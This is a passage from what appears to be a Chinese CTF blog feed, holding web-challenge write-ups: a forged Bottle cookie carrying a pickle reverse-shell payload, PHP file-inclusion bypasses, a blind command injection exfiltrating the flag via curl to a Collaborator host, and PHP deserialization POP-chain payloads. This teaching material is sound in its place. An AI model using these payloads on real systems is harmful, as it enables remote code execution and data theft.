class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">tob</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> enc<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>enc<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">unicode</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_cookie</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> secret<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    value <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    <span class="token keyword">if</span> secret <span class="token keyword">and</span> value<span class="token punctuation">:</span>        dec <span class="token operator">=</span> cookie_decode<span class="token punctuation">(</span>value<span class="token punctuation">,</span> secret<span class="token punctuation">)</span>        <span class="token keyword">return</span> dec<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">if</span> dec <span class="token keyword">and</span> dec<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> key <span class="token keyword">else</span> default    <span class="token keyword">return</span> value <span class="token keyword">or</span> default<span class="token keyword">def</span> <span class="token function">cookie_is_encoded</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">bool</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>tob<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span> tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span> <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">_lscmp</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token keyword">not</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token keyword">if</span> x <span class="token operator">==</span> y <span class="token keyword">else</span> <span class="token number">1</span> <span class="token keyword">for</span> x<span class="token punctuation">,</span> y <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_cookie</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">,</span> secret<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>options<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> secret<span class="token punctuation">:</span>        value <span class="token operator">=</span> touni<span class="token punctuation">(</span>cookie_encode<span class="token punctuation">(</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>        resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> max_age<span class="token operator">=</span><span class="token number">3600</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> resp    <span class="token keyword">elif</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token builtin">basestring</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> TypeError<span class="token punctuation">(</span><span class="token string">'Secret key missing for non-string Cookie.'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">4096</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">'Cookie value to long.'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">touni</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> enc<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">,</span> err<span class="token operator">=</span><span class="token string">'strict'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>enc<span class="token punctuation">,</span> err<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token builtin">unicode</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>opcode<span class="token operator">=</span><span class="token triple-quoted-string string">b'''(cossystemS'bash -c "bash -i >&amp; /dev/tcp/VPS/5678 0>&amp;1"'o.'''</span>secret<span class="token operator">=</span><span class="token string">"EnjoyThePlayTime123456"</span>exp <span class="token operator">=</span> touni<span class="token punctuation">(</span>cookie_encode<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">,</span> opcode<span class="token punctuation">)</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 羊城杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF2024-web</title>
      <link href="/2024/08/18/BaseCTF2024-web/"/>
      <url>/2024/08/18/BaseCTF2024-web/</url>
      
        <content type="html"><![CDATA[<h4 id="Aura-酱的礼物-url"><a href="#Aura-酱的礼物-url" class="headerlink" title="Aura 酱的礼物(url@)"></a>Aura 酱的礼物(url@)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Aura 酱，欢迎回家~ </span><span class="token comment">// 这里有一份礼物，请你签收一下哟~ </span><span class="token variable">$pen</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pen'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$pen</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'Aura'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'这是 Aura 的礼物，你不是 Aura！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 礼物收到啦，接下来要去博客里面写下感想哦~ </span><span class="token variable">$challenge</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'challenge'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'http://jasmineaura.github.io'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'这不是 Aura 的博客！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$blog_content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$blog_content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'已经收到Kengwang的礼物啦'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'请去博客里面写下感想哦~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~ </span><span class="token variable">$gift</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gift'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$gift</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><p><strong>file_get_contents()</strong></p><p>语法：file_get_contents(path,include_path,context,start,max_length)</p><p>该函数是用于把文件的内容读入到一个字符串里的方法。</p><p>这个函数绕过方式有多种：</p><p><strong>php:&#x2F;&#x2F;input伪协议绕过</strong></p><ol><li>将要GET的参数?xxx&#x3D;php:&#x2F;&#x2F;input</li><li>用post方法传入想要file_get_contents()函数返回的值</li></ol><p><strong>data:&#x2F;&#x2F;伪协议绕过</strong></p><ol><li>?xxx&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,想要file_get_contents()函数返回的值的base64编码</li><li>?xxx&#x3D;data:text&#x2F;plain,(url编码的内容)</li></ol><p>这里因为是POST传参所以采用data</p><p>strpos函数是返回需要查找的字符串在目标字符串的位置，这里要求为0，意味着必须在开头出现</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span>pen<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain,Aura&amp;challenge=http://jasmineaura.github.io</span></code></pre><p>第三个绕过需要用<code>file_get_contents</code>传入<code>challenge</code>变量，这里考点为<code>file_get_contents</code>本来的用法，以及url跳转</p><p>本页面就有<strong>已经收到Kengwang的礼物啦</strong>的字样</p><p>所以传入<code>challenge=http://jasmineaura.github.io@challenge.basectf.fun:22657/</code>即可绕过</p><p>最后就是一个简单的文件包含</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span>pen<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain,Aura&amp;challenge=http://jasmineaura.github.io@challenge.basectf.fun:22657&amp;gift=php://filter/convert.base64-encode/resource=flag.php</span></code></pre><h4 id="你听不到我的声音"><a href="#你听不到我的声音" class="headerlink" title="你听不到我的声音"></a>你听不到我的声音</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><p>没回显，本来想反弹shell，没成功，直接用bp的Collaborator外带出来</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span>cmd<span class="token operator">=</span>curl<span class="token operator">%</span><span class="token number">2017698</span>qgbtquwasnhu67e3mej1a71vsjh<span class="token operator">.</span>oastify<span class="token operator">.</span>com<span class="token operator">/</span><span class="token string backtick-quoted-string">`tac%20/flag`</span></code></pre><p><img src="shell_exec.png" loading="lazy"></p><h4 id="ez-ser"><a href="#ez-ser" class="headerlink" title="ez_ser"></a>ez_ser</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">re</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$chu0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"I can not believes!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token operator">-></span><span class="token variable">$nononono</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">web</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$kw</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dt</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"lalalla"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">kw</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ALL Done!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">pwn</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$dusk</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$over</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dusk</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"gods"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"什么，你竟敢不认可?"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">over</span><span class="token operator">-></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$nothing</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('cat /flag');"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Crypto</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"happy happy happy!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you are over!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ser'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>Pop链如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">re</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$chu0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">web</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$kw</span> <span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">pwn</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$dusk</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$over</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$nothing</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">web</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">kw</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">re</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">kw</span><span class="token operator">-></span><span class="token property">chu0</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">kw</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token operator">-></span><span class="token property">over</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Misc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>ser<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>web<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>kw<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>re<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>chu0<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>pwn<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>dusk<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>over<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Misc<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>nothing<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>flag<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D</code></pre><h4 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP"></a>Really EZ POP</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sink</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo 123;'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Shark</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$word</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Hello, World!'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Shark says:'</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">word</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sea</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$animal</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$sea_ani</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">animal</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'In a deep deep sea, there is a '</span> <span class="token operator">.</span> <span class="token variable">$sea_ani</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Nature</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sea</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">see</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$nature</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>Pop链：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sink</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Shark</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$word</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sea</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$animal</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Nature</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sea</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Nature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">sea</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sea</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">animal</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Shark</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">animal</span><span class="token operator">-></span><span class="token property">word</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sink</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">animal</span><span class="token operator">-></span><span class="token property">word</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system('tac\$&#123;IFS&#125;/flag');"</span><span class="token punctuation">;</span><span class="token variable">$tmp</span><span class="token operator">=</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token 